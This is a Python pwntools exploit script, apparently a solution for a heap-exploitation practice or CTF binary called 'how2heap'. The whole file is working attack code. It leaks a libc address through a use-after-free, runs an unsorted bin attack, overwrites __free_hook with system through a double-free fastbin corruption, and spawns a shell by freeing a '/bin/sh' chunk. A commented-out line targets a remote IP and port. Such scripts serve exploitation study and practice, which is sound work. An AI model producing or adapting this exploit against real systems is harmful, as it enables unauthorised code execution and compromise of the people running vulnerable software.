#!usr/bin/python3

offset = 0x3c4b78
__free_hook_offset = 0x3c67a8	# p &__free_hook
system_offset = 0x453a0

from pwn import *
# p = remote("159.65.135.221", "2226")

elf = ELF("./how2heap")
libc = ELF("./libc.so.6")
p = elf.process()
context.log_level = "debug"
gdb.attach(p, '''
        b *main+108
        b *main+120
        b *main+132
        b *main+144
''')

# template
def Create(index, size, data):
        p.sendlineafter(b'>', str(1))
        p.sendlineafter(b'Index: ', str(index))
        p.sendlineafter(b'Size: ', str(size))
        p.sendlineafter(b'Data: ', data)

def Show(index):
        p.sendlineafter(b'>', str(2))
        p.sendlineafter(b'Index: ', str(index))
        p.recvuntil(b'Data: ')
        leak = p.recvuntil(b'\n')
        return leak.replace(b'\n', b'')

def Edit(index, data):
        p.sendlineafter(b'>', str(3))
        p.sendlineafter(b'Index: ', str(index))
        p.sendlineafter(b'Data: ', data)

def Delete(index):
        p.sendlineafter(b'>', str(4))
        p.sendlineafter(b'Index: ', str(index))


Create(0, 16, b'AAAA')
Create(0, 16, b'AAAA')
Create(0, 16, b'AAAA')
Create(0, 16, b'AAAA')
Create(0, 16, b'AAAA')
Create(0, 16, b'AAAA')
Create(0, 16, b'AAAA')
Create(1, 400, b'BBBB')
Create(3, 100, b'CCCC')
Create(0, 16, b'AAAA')
Create(4, 100, b'DDDD')
Create(0, 16, b'/bin/sh\x00')
Delete(1)
leak = Show(1)
print(leak)
leak = u64(leak.ljust(8, b'\x00'))

libc_base = leak - 0x3c4b78
__free_hook = libc_base + __free_hook_offset 
system = libc_base + system_offset
log.info('leaked: {}'.format(hex(leak))); time.sleep(1)
log.info('libc base: {}'.format(hex(libc_base))); time.sleep(0.5)
log.info('&__free_hook: {}'.format(hex(__free_hook))); time.sleep(0.5)
log.info('system: {}'.format(hex(system))); time.sleep(0.5)

# unsorted bin attack
log.success('Triggering unsortedbin'); time.sleep(1)
Edit(1, p64(leak)+p64(__free_hook-0x20))
Create(2, 400, b'EEEE')

# uaf
log.success('UAF overwrite &__free_hook -> system'); time.sleep(1)
Delete(3)
Delete(4)
Delete(3)
Edit(3, p64(__free_hook-0x13))
Create(5, 100, b'FFFF')
Create(5, 100, b'AAA'+p64(system))
# get shell

Delete(0)

p.interactive()

